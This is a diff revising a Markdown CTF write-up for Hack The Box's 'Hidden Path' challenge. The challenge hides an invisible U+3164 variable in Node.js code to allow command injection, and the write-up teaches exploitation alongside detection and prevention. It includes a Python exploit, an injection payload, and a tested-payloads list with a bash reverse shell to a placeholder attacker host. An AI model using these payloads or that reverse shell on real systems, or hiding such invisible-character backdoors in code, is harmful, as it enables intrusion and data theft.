@@ -1,35 +1,56 @@
-# Hidden Path - Hack The Box Labs
+<div align="center">
 
-![Difficulty: Easy](https://img.shields.io/badge/Difficulty-Easy-green)
-![Category: Misc](https://img.shields.io/badge/Category-Misc-blue)
-![Points: 1000](https://img.shields.io/badge/Points-1000-yellow)
+# Hidden Path — HackTheBox
 
-## Challenge Info
+![Difficulty](https://img.shields.io/badge/Difficulty-Easy-green?style=for-the-badge)
+![OS](https://img.shields.io/badge/OS-N%2FA-blue?style=for-the-badge)
+![Status](https://img.shields.io/badge/Status-Rooted-success?style=for-the-badge)
 
-**Keywords:** unicode homoglyph, command injection, U+3164, invisible character, nodejs, express, destructuring, variable reference, hangul jungseong filler, array injection, system check endpoint, misc easy 1000 points  
-**Tags:** #javascript #nodejs #command-injection #unicode #homoglyph #u3164 #express #invisible-character #misc-easy #hackthebox #ctf  
-**Flag:** `HTB{1nvi5IBl3_cH4r4cT3rS_n0t_sO_v1SIbL3_████████████████████████████████}`  
-**Search Terms:** unicode injection exploit, U+3164 vulnerability, invisible character attack, nodejs command injection, express destructuring bypass, hackthebox hidden path walkthrough, hackthebox hidden path solution, hiddenpath htb, hidden-path ctf, hangul jungseong filler exploit
+<img src="../assets/MrsNobody.png" width="200" alt="MrsNobody">
 
-- **Name**: Hidden Path
-- **Category**: Misc
-- **Difficulty**: Easy
-- **Points**: 1000
-- **Date**: 2026-03-18
+**MrsNobody**
+
+[![HTB](https://img.shields.io/badge/HackTheBox-Profile-green?style=flat&logo=hackthebox)](https://app.hackthebox.com)
+
+---
+
+</div>
+
+> **Disclaimer:** This writeup is for educational purposes only, performed in an authorized Hack The Box environment.
+
+## Target Information
+
+| Property | Value |
+|----------|-------|
+| Machine | Hidden Path |
+| IP | `<CHALLENGE_IP>` |
+| OS | N/A |
+| Difficulty | Easy |
+| Category | Misc |
+| Port | 30224 |
+
+## Table of Contents
+
+1. [Description](#description)
+2. [Source Code Analysis](#source-code-analysis)
+3. [Vulnerability](#vulnerability)
+4. [Exploitation](#exploitation)
+5. [Exploit Script](#exploit-script)
+6. [How It Works](#how-it-works)
+7. [Additional Payloads Tested](#additional-payloads-tested)
+8. [Detection and Prevention](#detection-and-prevention)
+9. [Key Takeaways](#key-takeaways)
+10. [Flags](#flags)
+
+---
 
 ## Description
 
 Legends speak of the infamous Kamara-Heto, a black-hat hacker of old who rose to fame as they brought entire countries to their knees. Opinions are divided over whether the fabled figure truly existed, but the success of the team surely lies in the hope that they did, for the location of the lost vault is only known to be held on what remains of the NSA's data centres. You have extracted the source code of a system check-up endpoint - can you find a way in? And was Kamara-Heto ever there?
 
-## Target Information
+---
 
-- **IP**: <CHALLENGE_IP>
-- **Port**: 30224
-- **Type**: Command Injection via Unicode Homoglyph
-
-## Solution
-
-### Source Code Analysis
+## Source Code Analysis
 
 The provided `app.js` contained a subtle but critical vulnerability:
 
@@ -57,27 +78,33 @@ app.post('/server_status', async (req, res) => {
 });
 ```
 
-### Vulnerability
+---
+
+## Vulnerability
 
 **Type**: Command Injection via Unicode Homoglyph (U+3164)
 
-**Unicode Character**: `ㅤ` (U+3164 HANGUL JUNGSEONG FILLER)
+**Unicode Character**: U+3164 HANGUL JUNGSEONG FILLER
 
 This invisible character appears twice in the code:
+
 1. In the destructuring pattern `const { choice,ㅤ}` - extracts a hidden parameter from request body
-2. In the commands array `'ps aux',ㅤ` - the 7th element references the **variable**, not a string literal
+2. In the commands array `'ps aux',ㅤ` - the 7th element references the variable, not a string literal
 
-When `choice=6` is sent, `commands[6]` evaluates to the current value of the invisible variable `ㅤ`, which can be controlled via POST data.
+When `choice=6` is sent, `commands[6]` evaluates to the current value of the invisible variable, which can be controlled via POST data.
 
-### Exploitation
+---
 
-**Exploit Flow**:
+## Exploitation
+
+### Exploit Flow
 
 1. Send `choice=6` to select the 7th array element
-2. Send the invisible character parameter (U+3164) with our command
-3. The server executes our injected command
+2. Send the invisible character parameter (U+3164) with the desired command
+3. The server executes the injected command
 
-**Payload**:
+### Payload
+
 ```http
 POST /server_status HTTP/1.1
 Host: <CHALLENGE_IP>:30224
@@ -87,11 +114,14 @@ choice=6&ㅤ=cat flag.txt
 ```
 
 URL-encoded:
+
 ```
 choice=6&%E3%85%A4=cat%20flag.txt
 ```
 
-### Exploit Script (Python)
+---
+
+## Exploit Script
 
 ```python
 import requests
@@ -108,10 +138,11 @@ r = requests.post(
     headers={'Content-Type': 'application/x-www-form-urlencoded'}
 )
 print(r.text)
-# Output: HTB{1nvi5IBl3_cH4r4cT3rS_n0t_sO_v1SIbL3_████████████████████████████████}
 ```
 
-### How It Works
+---
+
+## How It Works
 
 ```
 1. Client sends: choice=6&ㅤ=cat flag.txt
@@ -123,50 +154,12 @@ print(r.text)
 3. commands array is defined:
    commands[6] = reference to variable ㅤ
    
-4. exec(commands[6]) → exec('cat flag.txt')
+4. exec(commands[6]) -> exec('cat flag.txt')
 
 5. Flag is returned in response
 ```
 
-## Flag
-
-```
-HTB{1nvi5IBl3_cH4r4cT3rS_n0t_sO_v1SIbL3_████████████████████████████████}
-```
-
-## Key Takeaways
-
-1. **Unicode homoglyphs** (U+3164) can create hidden parameters that bypass validation
-2. **Variable references in array literals** use the variable's current value at execution time, not the value at definition time
-3. **Destructuring assignments** with unusual identifiers can extract hidden form data
-4. Array bounds checking can be bypassed when array elements reference mutable variables
-5. Always sanitize and validate ALL user inputs, including unexpected parameter names
-
-## Tools Used
-
-- `curl` - HTTP requests
-- Python `requests` library - Automated exploitation
-- `urllib.parse` - URL encoding
-
-## References
-
-- [Unicode U+3164 - Hangul Jungseong Filler](https://unicode-table.com/en/3164/)
-- [Node.js Destructuring Assignment](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Operators/Destructuring_assignment)
-- [Express Body Parsing](https://expressjs.com/en/api.html#express.urlencoded)
-
-## Detection & Prevention
-
-**Detection**:
-- Search source code for unusual Unicode characters using `grep -r $'\u3164' .`
-- Check for variable names outside normal ASCII range
-- Audit array definitions that reference variables
-- Test POST endpoints with unexpected parameter names
-
-**Prevention**:
-- Validate and whitelist allowed parameter names
-- Use linters with Unicode detection (e.g., ESLint `no-irregular-whitespace`)
-- Avoid using variables as array elements in security-critical code
-- Implement strict input validation on all parameters
+---
 
 ## Additional Payloads Tested
 
@@ -184,3 +177,58 @@ choice=6&ㅤ=env
 choice=6&ㅤ=bash -c 'bash -i >& /dev/tcp/ATTACKER/PORT 0>&1'
 ```
 
+---
+
+## Detection and Prevention
+
+### Detection
+
+- Search source code for unusual Unicode characters using `grep -r $'\u3164' .`
+- Check for variable names outside normal ASCII range
+- Audit array definitions that reference variables
+- Test POST endpoints with unexpected parameter names
+
+### Prevention
+
+- Validate and whitelist allowed parameter names
+- Use linters with Unicode detection (e.g., ESLint `no-irregular-whitespace`)
+- Avoid using variables as array elements in security-critical code
+- Implement strict input validation on all parameters
+
+---
+
+## Key Takeaways
+
+1. Unicode homoglyphs (U+3164) can create hidden parameters that bypass validation
+2. Variable references in array literals use the variable's current value at execution time, not the value at definition time
+3. Destructuring assignments with unusual identifiers can extract hidden form data
+4. Array bounds checking can be bypassed when array elements reference mutable variables
+5. Always sanitize and validate all user inputs, including unexpected parameter names
+
+---
+
+## References
+
+- [Unicode U+3164 - Hangul Jungseong Filler](https://unicode-table.com/en/3164/)
+- [Node.js Destructuring Assignment](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Operators/Destructuring_assignment)
+- [Express Body Parsing](https://expressjs.com/en/api.html#express.urlencoded)
+
+---
+
+## Flags
+
+| Flag | Value |
+|------|-------|
+| Challenge | `HTB{1nvi5IBl3_cH4r4cT3rS_n0t_sO_v1SIbL3_████████████████████████████████}` |
+
+---
+
+<div align="center">
+
+**Written by MrsNobody**
+
+<img src="../assets/MrsNobody.png" width="80">
+
+*Hack The Box — Hidden Path*
+
+</div>
